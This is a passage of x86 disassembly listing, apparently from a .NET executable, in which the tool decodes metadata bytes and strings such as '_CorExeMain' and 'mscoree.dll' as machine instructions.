  4098a4:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  4098a9:	1e                   	push   %ds
  4098aa:	01 12                	add    %edx,(%edx)
  4098ac:	82 3d 12 82 39 1c 05 	cmpb   $0x5,0x1c398212
  4098b3:	0a 02                	or     (%edx),%al
  4098b5:	0e                   	push   %cs
  4098b6:	12 7d 04             	adc    0x4(%ebp),%bh
  4098b9:	20 01                	and    %al,(%ecx)
  4098bb:	02 08                	add    (%eax),%cl
  4098bd:	05 20 00 12 82       	add    $0x82120020,%eax
  4098c2:	45                   	inc    %ebp
  4098c3:	05 20 00 11 82       	add    $0x82110020,%eax
  4098c8:	49                   	dec    %ecx
  4098c9:	55                   	push   %ebp
  4098ca:	07                   	pop    %es
  4098cb:	22 12                	and    (%edx),%dl
  4098cd:	48                   	dec    %eax
  4098ce:	02 0e                	add    (%esi),%cl
  4098d0:	12 3c 12             	adc    (%edx,%edx,1),%bh
  4098d3:	81 e1 12 81 e9 15    	and    $0x15e98112,%ecx
  4098d9:	12 81 cd 01 0e 0e    	adc    0xe0e01cd(%ecx),%al
  4098df:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  4098e4:	12 7d 08             	adc    0x8(%ebp),%bh
  4098e7:	08 02                	or     %al,(%edx)
  4098e9:	0e                   	push   %cs
  4098ea:	0e                   	push   %cs
  4098eb:	1d 0e 12 81 25       	sbb    $0x2581120e,%eax
  4098f0:	12 82 09 12 82 11    	adc    0x11821209(%edx),%al
  4098f6:	0e                   	push   %cs
  4098f7:	0e                   	push   %cs
  4098f8:	12 82 1d 08 12 82    	adc    -0x7dedf7e3(%edx),%al
  4098fe:	21 0d 15 12 81 f1    	and    %ecx,0xf1811215
  409904:	01 12                	add    %edx,(%edx)
  409906:	81 c5 15 12 81 f1    	add    $0xf1811215,%ebp
  40990c:	01 12                	add    %edx,(%edx)
  40990e:	81 c5 12 82 39 12    	add    $0x12398212,%ebp
  409914:	4c                   	dec    %esp
  409915:	08 1d 0e 08 1d 0e    	or     %bl,0xe1d080e
  40991b:	1d 03 1d 0e 05       	sbb    $0x50e1d03,%eax
  409920:	01 00                	add    %eax,(%eax)
  409922:	00 00                	add    %al,(%eax)
  409924:	00 08                	add    %cl,(%eax)
  409926:	01 00                	add    %eax,(%eax)
  409928:	08 00                	or     %al,(%eax)
  40992a:	00 00                	add    %al,(%eax)
  40992c:	00 00                	add    %al,(%eax)
  40992e:	1e                   	push   %ds
  40992f:	01 00                	add    %eax,(%eax)
  409931:	01 00                	add    %eax,(%eax)
  409933:	54                   	push   %esp
  409934:	02 16                	add    (%esi),%dl
  409936:	57                   	push   %edi
  409937:	72 61                	jb     0x40999a
  409939:	70 4e                	jo     0x409989
  40993b:	6f                   	outsl  %ds:(%esi),(%dx)
  40993c:	6e                   	outsb  %ds:(%esi),(%dx)
  40993d:	45                   	inc    %ebp
  40993e:	78 63                	js     0x4099a3
  409940:	65 70 74             	gs jo  0x4099b7
  409943:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40994a:	77 73                	ja     0x4099bf
  40994c:	01 00                	add    %eax,(%eax)
  40994e:	00 00                	add    %al,(%eax)
  409950:	78 99                	js     0x4098eb
	...
  40995a:	00 00                	add    %al,(%eax)
  40995c:	8e 99 00 00 00 20    	mov    0x20000000(%ecx),%ds
	...
  409976:	00 00                	add    %al,(%eax)
  409978:	80 99 00 00 00 00 00 	sbbb   $0x0,0x0(%ecx)
  40997f:	00 00                	add    %al,(%eax)
  409981:	00 5f 43             	add    %bl,0x43(%edi)
  409984:	6f                   	outsl  %ds:(%esi),(%dx)
  409985:	72 45                	jb     0x4099cc
  409987:	78 65                	js     0x4099ee
  409989:	4d                   	dec    %ebp
  40998a:	61                   	popa
  40998b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  409992:	72 65                	jb     0x4099f9
  409994:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  409998:	6c                   	insb   (%dx),%es:(%edi)
  409999:	00 00                	add    %al,(%eax)
  40999b:	00 00                	add    %al,(%eax)
  40999d:	00 ff                	add    %bh,%bh
  40999f:	25 00 20 40 00       	and    $0x402000,%eax
